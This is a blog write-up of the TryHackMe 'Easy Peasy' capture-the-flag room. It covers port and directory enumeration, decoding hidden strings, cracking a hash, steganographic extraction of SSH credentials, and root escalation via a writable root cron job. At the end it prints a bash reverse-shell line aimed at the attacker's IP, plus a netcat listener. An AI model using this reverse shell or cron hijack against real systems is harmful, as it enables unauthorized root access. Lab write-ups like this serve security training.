<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="stylesheet" href="/_next/static/css/816f3edd0640ecf0.css" data-precedence="next.js"/><link rel="stylesheet" href="/_next/static/css/2a1840b1c557e13c.css" data-precedence="next.js"/><link rel="preload" as="script" href="//gc.zgo.at/count.js"/><title>/dev/blog - /dev/blog - TryHackMe - Easy Peasy</title><meta name="description" content="Writeup for the TryHackMe room Easy Peasy, a CTF like vulnerable machine."/><meta name="application-name" content="/dev/blog"/><meta name="generator" content="Next.js"/><meta name="keywords" content="Dev,Blog,Programmings"/><meta name="referrer" content="origin-when-cross-origin"/><meta name="theme-color" content="amber"/><meta name="color-scheme" content="dark"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="creator" content="Joshua Chapman"/><link rel="canonical" href="https://joshuachp.dev/posts/2020-08-06_tryhackme_easy_peasy"/><link rel="icon" href="/favicon.svg" type="image/svg+xml"/><link rel="icon" href="/favicon.png" type="image/png"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script>(self.__next_s=self.__next_s||[]).push([0,{"children":"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')&&window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}"}])</script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" nomodule=""></script></head><body class="bg-primary-50 dark:bg-primary-900"><header class="flex flex-row items-baseline justify-between gap-4 p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><nav class="flex flex-grow flex-row flex-wrap gap-y-4"><a title="Home page" class="mr-8" href="/"><h1 class=" text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl">/dev/blog</h1></a><ul class="flex flex-grow flex-row items-end justify-start gap-8"><li><a title="Posts" href="/posts"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50 underline font-bold">Posts</span></a></li><li><a title="Notes" href="/notes"><span class="text-xl md:text-2xl text-primary-900 dark:text-primary-50  font-bold">Notes</span></a></li></ul></nav><div><button class="rounded border-t-2 border-l-2 border-r-4 border-b-4  border-primary-900 px-4 py-2 text-sm font-medium text-primary-900  hover:bg-primary-100 active:translate-y-0.5 dark:border-primary-50 dark:text-primary-50 dark:hover:bg-primary-800 "><span class="text-sm sm:text-base xl:text-lg text-primary-900 dark:text-primary-50 font-semibold">Auto</span></button></div></header><main class="flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96"><article class="flex max-w-full grow flex-col justify-self-start"><h1 class="mb-4 text-primary-900 dark:text-primary-50 text-4xl font-extrabold tracking-tight sm:text-5xl md:text-6xl"><span>TryHackMe - Easy Peasy</span></h1><blockquote><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The room link can be found at</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://tryhackme.com/room/easypeasyctf"><span>TryHackMe - Easy Peasy</span></a></p></blockquote><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Enumeration</span></h2><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>First we scan for open ports and services</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Nmap</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We use nmap with some default arguments.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -sV -sC -oA nmap/first $IP
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>It will return.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>From the first scan we can see that port </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">80</code><span> is open with </span><strong><span>nginx</span></strong><span> version</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">1.16.1</code></p><h4 class="mb-4 text-primary-900 dark:text-primary-50 text-xl font-semibold tracking-tight sm:text-2xl md:text-3xl"><span>All ports</span></h4><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>So let</span><span>’</span><span>s retry for all ports </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-p-</code><span> in the background, using </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-v</code><span> to increase</span>
<span>the verbosity and removing the scripts </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-sC</code><span> and version </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">-sV</code><span> parameters.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -v -p- -oA nmap/all $IP
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>This returns three ports open</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Let</span><span>’</span><span>s try to gather more information from those ports, scanning only those</span>
<span>specifically.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>sudo nmap -sC -sV -oA nmap/ports -p 80,65524,6498 $IP
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The output is the following</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>So summing up we have:</span></p><ol start="1" class="mb-4 mt-2 ml-6 text-primary-900 dark:text-primary-50 text-sm sm:text-base xl:text-lg list-decimal"><li class="mb-2"><span>HTTP port 80 with nginx</span></li><li class="mb-2"><span>SSH port 6498 with OpenSSH</span></li><li class="mb-2"><span>HTTP port 65524 with Apache</span></li></ol><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Gobuster</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>While scanning for other open ports let</span><span>’</span><span>s start </span><strong><span>gobuster</span></strong><span> to enumerate</span>
<span>directories on http port </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">80</code><span>. We will use the</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt"><span>Seclist big</span></a>
<span>wordlist.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/nginx -w big.txt -u http://$IP/
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Gobuster finds an </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hidden</code><span> directory.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:50:37 Starting gobuster
===============================================================
/hidden (Status: 301)
/robots.txt (Status: 200)
===============================================================
2020/08/10 13:54:18 Finished
===============================================================
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Let</span><span>’</span><span>s also scan the Apache server.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/apache -w big.txt -u http://$IP:65524/
</span></code></pre><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP:65524/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 13:54:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/10 13:57:18 Finished
===============================================================
</span></code></pre><h2 class="mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl"><span>Compromising</span></h2><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The second fase is a bit more confusing and the directions to find the flags</span>
<span>aren</span><span>’</span><span>t clear, but the access on the box is and privilege escalation is straight</span>
<span>forward.</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 1</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Futher enumerating the </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hidden</code><span> directory with gobuster we find another</span>
<span>directory called </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">wathever</code><span>.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>gobuster dir -o gobuster/hidden -w big.txt -u http://$IP/hidden/
</span></code></pre><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$IP/hidden/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/10 14:13:44 Starting gobuster
===============================================================
/whatever (Status: 301)
===============================================================
2020/08/10 14:16:48 Finished
===============================================================
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Viewing the source code of the page there is an hidden </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">p</code><span> with a </span><strong><span>base64</span></strong>
<span>encoded string.</span></p><pre class="language-html mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p hidden&gt;Z____________________Q==&lt;/p&gt;
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Decoding it we can find the first flag.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>echo Z____________________Q== | base64 -d

flag{__________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 2</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Using gobuster we have found </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">robots.txt</code><span> in the Apache server which shous us</span>
<strong><span>User-Agent</span></strong><span>.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a______________________________0
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The solution wasn</span><span>’</span><span>t so good. You have to find the solution online in some</span>
<span>obscure site searching for the hash :thinking:</span><span>…</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>flag{______________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Flag 3</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On the Apache home page we can find the third flag.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>Fl4g 3 : flag{________________________________}
</span></code></pre><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>User Flag</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On the Apache main page in the source we can see an hidden </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">p</code><span> again.</span></p><pre class="language-html mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p hidden&gt;its encoded with ba....:O______________________u&lt;/p&gt;
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Since it is encoded with a base we open</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://gchq.github.io/CyberChef/"><span>Chyberchef</span></a><span> and try out a bunch of</span>
<span>encodings.</span></p><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>With </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">base62</code><span> we can find something that looks like an hidden directory.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>/n0th1ng3ls3m4tt3r
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>On this page we find a long string and an image.</span></p><pre class="language-html mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>&lt;p&gt;9______________________________________________________________1&lt;/p&gt;
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The hint tell us that it</span><span>’</span><span>s GHOST, so we use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">hashcat</code><span> and the wordlist that was</span>
<span>provided to crack it.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>hashcat -a 0 -m 6900 hash.txt easypeasy.txt
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>With a bit of guessing we can use </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">steghide</code><span> on the image to extract some data.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The output are user and password information, the password is encoded in</span>
<span>binary.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>username:b____g
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Using Cyberchef we can get the credentials.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>username: b____g
password: i__________________________y
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Those are the credentials for the SSH. So when you access you can find the user</span>
<span>flag.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a______________y}
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Which is a </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">rot13</code><span> of </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">flag{________________}</code><span>.</span></p><h3 class="mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl"><span>Root Flag</span></h3><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Uploading</span>
<a title="" class="font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><span>Linpeas</span></a>
<span>on the box we can find a cronjob that is run as root and execute a script</span>
<code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/var/www/.mysecretcronjob.sh</code><span>.</span></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>We can put a reverse shell in the script to gain root access on the box.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>bash -i &gt;&amp; /dev/tcp/$USER_IP/9000 0&gt;&amp;1
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>Open a listener and wait for the job to fire.</span></p><pre class="language-bash mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>nc -lvnp 9000
</span></code></pre><p class="mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg"><span>The root flag is in a file </span><code class=" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg">/root/.root.txt</code></p><pre class="language-plaintext mb-4 mt-2 overflow-auto rounded border-2 border-primary-900 p-4 dark:border-primary-50"><code><span>flag{________________________________}
</span></code></pre></article></main><script src="/_next/static/chunks/webpack-e24f1f8cbee90348.js" async=""></script><script src="/_next/static/chunks/2443530c-65ca4daeaf429502.js" async=""></script><script src="/_next/static/chunks/961-409d5e344dd5ce3d.js" async=""></script><script src="/_next/static/chunks/main-app-8f2d29d5c797a129.js" async=""></script></body></html><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"0:\"$L1\"\n"])</script><script>self.__next_f.push([1,"2:I{\"id\":\"8462\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n4:I{\"id\":\"9178\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"1:[\"$\",\"$L2\",null,{\"assetPrefix\":\"\",\"initialCanonicalUrl\":\"/posts/2020-08-06_tryhackme_easy_peasy\",\"initialTree\":[\"\",{\"children\":[\"posts\",{\"children\":[[\"path\",\"2020-08-06_tryhackme_easy_peasy\",\"d\"],{\"children\":[\"__PAGE__?{\\\"path\\\":\\\"2020-08-06_tryhackme_easy_peasy\\\"}\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialHead\":\"$L3\",\"globalErrorComponent\":\"$4\",\"notFound\":\"$L5\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"children\":[\"$L6\",null,null,[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/816f3edd0640ecf0.css\",\"precedence\":\"next.js\"}]]]}]\n"])</script><script>self.__next_f.push([1,"7:I{\"id\":\"5376\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-e35d8b0528d4d717\"],\"async\":false}\n8:I{\"id\":\"6722\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-e35d8b0528d4d717\"],\"async\":false}\n9:I{\"id\":\"9299\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-e35d8b0528d4d717\"],\"async\":false}\na:I{\"id\":\"5019\",\"name\":\"\",\"chunks\":[\"619:619-3a70a20416de9ff0\",\"185:app/layout-e35d8b0528d4d717\"],\"async\":false}\nb:I{\"id\":\"1300\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee"])</script><script>self.__next_f.push([1,"90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\nc:I{\"id\":\"6022\",\"name\":\"\",\"chunks\":[\"272:webpack-e24f1f8cbee90348\",\"667:2443530c-65ca4daeaf429502\",\"961:961-409d5e344dd5ce3d\"],\"async\":false}\n"])</script><script>self.__next_f.push([1,"6:[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"$L7\",null,{\"production\":true,\"goatCounterApi\":\"a7d98e3f-b56b\"}],[\"$\",\"$L8\",null,{\"id\":\"dark-theme\",\"strategy\":\"beforeInteractive\",\"children\":\"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')\u0026\u0026window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}\"}]]}],[\"$\",\"body\",null,{\"className\":\"bg-primary-50 dark:bg-primary-900\",\"children\":[\"$\",\"$L9\",null,{\"children\":[[\"$\",\"$La\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96\",\"children\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$\",\"$Lb\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"posts\",\"children\",[\"path\",\"2020-08-06_tryhackme_easy_peasy\",\"d\"],\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"loading\":\"$undefined\",\"loadingStyles\":\"$undefined\",\"hasLoading\":false,\"template\":[\"$\",\"$Lc\",null,{}],\"templateStyles\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\",\"asNotFound\":false,\"childProp\":{\"current\":[\"$Ld\",null,null,[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2a1840b1c557e13c.css\",\"precedence\":\"next.js\"}]]],\"segment\":\"__PAGE__?{\\\"path\\\":\\\"2020-08-06_tryhackme_easy_peasy\\\"}\"}}],\"segment\":[\"path\",\"2020-08-06_tryhackme_easy_peasy\",\"d\"]}}],\"segment\":\"posts\"}}]}]]}]}]]}]\n"])</script><script>self.__next_f.push([1,"5:[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"$L7\",null,{\"production\":true,\"goatCounterApi\":\"a7d98e3f-b56b\"}],[\"$\",\"$L8\",null,{\"id\":\"dark-theme\",\"strategy\":\"beforeInteractive\",\"children\":\"if(localStorage.theme==='Dark'||((!('theme'in localStorage)||localStorage.theme==='Auto')\u0026\u0026window.matchMedia('(prefers-color-scheme: dark)').matches)){document.documentElement.classList.add('dark')}\"}]]}],[\"$\",\"body\",null,{\"className\":\"bg-primary-50 dark:bg-primary-900\",\"children\":[\"$\",\"$L9\",null,{\"children\":[[\"$\",\"$La\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex flex-col justify-center p-6 sm:px-12 md:px-24 lg:px-48 xl:px-60 2xl:px-96\",\"children\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI 